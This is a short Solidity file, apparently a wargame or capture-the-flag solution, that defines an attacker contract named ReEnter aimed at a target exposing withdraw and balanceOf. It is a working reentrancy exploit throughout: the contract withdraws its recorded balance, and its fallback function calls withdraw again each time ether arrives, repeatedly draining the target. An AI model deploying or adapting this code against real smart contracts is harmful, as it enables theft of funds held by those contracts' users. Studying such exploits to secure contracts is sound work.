pragma solidity ^0.6.0;

interface Reentrance {
function withdraw(uint _amount)  external;
function balanceOf(address _who) external view returns (uint balance);
}

contract ReEnter {

  address reentrance_addr; 

  constructor(address _addr) payable public {
      reentrance_addr = _addr;
  }

  function call_external() public {
      uint balance = Reentrance(reentrance_addr).balanceOf(address(this));
      Reentrance(reentrance_addr).withdraw(balance);
  }

  fallback() payable external {
      call_external();
  }
}